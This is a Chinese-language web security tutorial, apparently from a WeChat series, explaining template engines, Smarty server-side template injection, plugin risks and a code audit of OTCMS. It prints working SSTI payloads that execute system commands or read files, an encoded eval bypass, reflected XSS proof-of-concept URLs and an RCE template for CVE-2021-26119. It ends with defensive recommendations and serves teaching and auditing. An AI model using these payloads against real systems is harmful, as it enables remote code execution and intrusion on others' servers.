---
title: 第30天-Web开发安全深度剖析：从模板引擎到代码审计的攻防实战
url: https://mp.weixin.qq.com/s/yMdomnWCjJFEnIndapD6Bg
source: Doonsec's feed
date: 2026-02-14
fetch_date: 2026-02-15T04:16:32.469012
---

# 第30天-Web开发安全深度剖析：从模板引擎到代码审计的攻防实战

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Byhdgj3e9qshqEE2cqZicHIyeYLyH5SrgY1PcNcUUnUrLlRBGttbgCyWThSicX63gXqZzcdiazEyiayxjZd7IndiapxjMYc3qhcWVh1wqvmf6tibg/0?wx_fmt=jpeg)

# 第30天-Web开发安全深度剖析：从模板引擎到代码审计的攻防实战

原创

萧瑶
萧瑶

AlphaNet

![]()

在小说阅读器中沉浸阅读

当开发便利性遇上安全性，每一个设计决策都可能成为攻击者的突破口。

一、模板引擎：开发效率与安全风险的双刃剑

1.1 什么是模板引擎？

模板引擎是现代Web开发中不可或缺的组件，其核心价值在于实现前后端分离——让HTML界面与PHP程序代码解耦。简单来说，就是HTML文件中不再需要混写PHP代码。

工作原理：模板引擎通过变量替换机制工作。开发者在HTML文件中使用特定标签（如{name}），然后通过模板引擎的方法传递实际变量值进行渲染。

1.2 主流模板引擎一览

```

PHP框架：Smarty、Twig、CodeEval

Python框架：Jinja2、Mako、Tornado、Django

Java框架：Thymeleaf、Jade、Velocity、FreeMarker

JavaScript框架：doT、Nunjucks、Pug、Marko、EJS、Dust

```

1.3 Smarty模板引擎实战

下载与安装

```bash

# 从GitHub获取最新版本

https://github.com/smarty-php/smarty/releases

```

基本使用流程

```php

<?php

// index.php

require('smarty-demo/libs/Smarty.class.php');

$smarty = new Smarty;

// 目录配置

$smarty->template\_dir = 'smarty-demo/templates/';

$smarty->compile\_dir = 'smarty-demo/templates\_c/';

$smarty->cache\_dir = 'smarty-demo/cache/';

$smarty->config\_dir = 'smarty-demo/configs/';

// 变量赋值与显示

$smarty->assign('title', '欢迎使用 Smarty');

$smarty->display('index.tpl');

?>

```

模板文件 (index.tpl)

```html

<!DOCTYPE html>

<html>

<head>

<title>{$title}</title>

</head>

<body>

<h1>{$title}</h1>

<p>这是一个使用 Smarty 的例子。</p>

</body>

</html>

```

二、SSTI：服务器端模板注入攻击

2.1 漏洞原理

SSTI（Server Side Template Injection）发生在攻击者能够控制模板内容的情况下。当模板引擎对用户输入缺乏充分过滤，攻击者可以注入恶意模板代码，最终导致远程代码执行。

2.2 Smarty SSTI 攻击向量

基础探测

```smarty

{$smarty.version}  <!-- 查看版本信息 -->

{7\*7}              <!-- 测试表达式执行 -->

```

经典Payload示例

```smarty

<!-- 文件包含攻击 -->

string:{include file='C:/Windows/win.ini'}

<!-- 函数定义注入 -->

string:{function name='x(){};system(whoami);function '}{/function}

<!-- 对象方法调用 -->

string:{$smarty.template\_object->smarty->\_getSmartyObj()->display('string:{system(whoami)}')}

<!-- 编码绕过 -->

eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}

```

2.3 CVE 漏洞参考

· Smarty SSTI深度分析

· 模板引擎安全研究

三、插件组件：第三方扩展的安全隐患

3.1 常见插件类型

· 编辑器：UEditor、KindEditor、CKEditor

· 邮件处理：PHPMailer、SwiftMailer

· 图片处理：ImageMagick、GD库

3.2 UEditor编辑器使用示例

目录结构

```

dialogs/      # 对话框资源

lang/         # 语言文件

php/          # PHP后端代码

└── config.json  # 配置文件

themes/       # 主题样式

third-party/  # 第三方插件

ueditor.config.js  # 核心配置文件

```

基本集成

```html

<!-- 引入UEditor -->

<script type="text/javascript" src="ueditor/ueditor.config.js"></script>

<script type="text/javascript" src="ueditor/ueditor.all.min.js"></script>

<!-- 实例化编辑器 -->

<script>

var ue = UE.getEditor('container');

</script>

```

3.3 插件安全风险点

· 配置文件泄露敏感信息

· 文件上传功能缺乏验证

· 跨域配置不当导致CSRF

· 编辑器DOM XSS漏洞

四、实战代码审计：OTCMS漏洞分析

4.1 CMS简介

OTCMS（网钛CMS）基于PHP+MySQL，支持PHP 5.3-7.3版本。其架构特点：

· 非MVC传统架构

· 使用Smarty模板引擎

· 数据库采用MySQL

4.2 反射型XSS漏洞系列

案例1：users\_deal.php XSS

```php

// 漏洞代码

// inc\classJS.php HrefEnd()方法未使用AlertFilter()过滤

// users\_deal.php中backURL参数直接输出

// Payload

http://localhost/users\_deal.php?backURL=%23%22%3balert(1);//#

```

案例2：城市信息功能XSS

```php

// wap\users\read.php

// inc\classProvCity.php#GetCityOptionJs()中idName参数拼接输出

// Payload

http://localhost/wap/users/read.php?m=getCityData&idName=%3Cscript%3Ealert(1);%3C/script%3E

```

案例3：apiRun.php XSS

```php

// $mode参数直接从$\_GET获取未过滤

// Payload

http://localhost/apiRun.php?mode=%22;alert(1);//&mudi=autoRun

```

4.3 SSRF漏洞分析

SSRF案例1：二维码解析功能

```php

// inc\QrReader\QrReader.php#\_\_construct()

// file\_get\_contents获取外部图片，非图片时会报错但不阻止SSRF

// admin\readDeal.php#ReadQrCode()传入可控img参数

```

SSRF案例2：CURL请求功能

```php

// inc\classReqUrl.php#UseCurl()

// admin\read.php#GetSignal()获取signalUrl参数

// 可利用延迟回显进行内网探测

```

4.4 SSTI漏洞深度挖掘

后台模板管理功能

OTCMS对Smarty标签做了特殊处理，要求以otcms:开头：

```smarty

<!-- 普通表达式 -->

{otcms:7\*7}

<!-- 查看版本 -->

{otcms:$smarty.version}

```

利用CVE-2021-26119实现RCE

```smarty

<!-- 写入恶意模板 -->

{otcms:system('whoami')}

```

漏洞代码分析

```php

// admin\template\_deal.php#AddOrRevFile()

// fileContent直接写入文件，未做任何SSTI防范

```

五、安全开发建议

5.1 模板引擎安全配置

1. 禁用危险函数：在模板中禁用system、exec等执行函数

2. 沙箱模式：启用模板沙箱，限制对敏感对象的访问

3. 输入验证：严格过滤用户输入的模板内容

4. 最小权限：运行PHP进程使用最小权限账户

5.2 插件安全实践

1. 及时更新：关注官方安全公告，及时升级版本

2. 功能裁剪：移除不需要的插件功能和示例文件

3. 上传验证：严格验证文件类型、内容，重命名存储

4. 配置审查：检查插件默认配置是否暴露敏感信息

5.3 代码审计要点

1. 用户输入：追踪$\_GET、$\_POST、$\_COOKIE等来源

2. 危险函数：搜索eval、system、file\_put\_contents等

3. 模板渲染：关注模板赋值和渲染过程中的变量控制

4. 第三方组件：审计引用第三方组件的版本和已知漏洞

六、总结

从模板引擎到第三方插件，Web开发的每个环节都可能引入安全风险。OTCMS的案例告诉我们：

· XSS漏洞：大多源于参数直接输出未过滤

· SSRF漏洞：源于文件读取、CURL请求对外部URL的信任

· SSTI漏洞：源于模板内容被用户控制

安全开发的核心原则：永远不要信任用户输入，在数据进入任何解释器（数据库、模板引擎、操作系统）前进行验证和过滤。

---

参考资料：

· 网钛系统代码审计

· KindEditor漏洞分析

· UEditor使用方法

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

AlphaNet

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过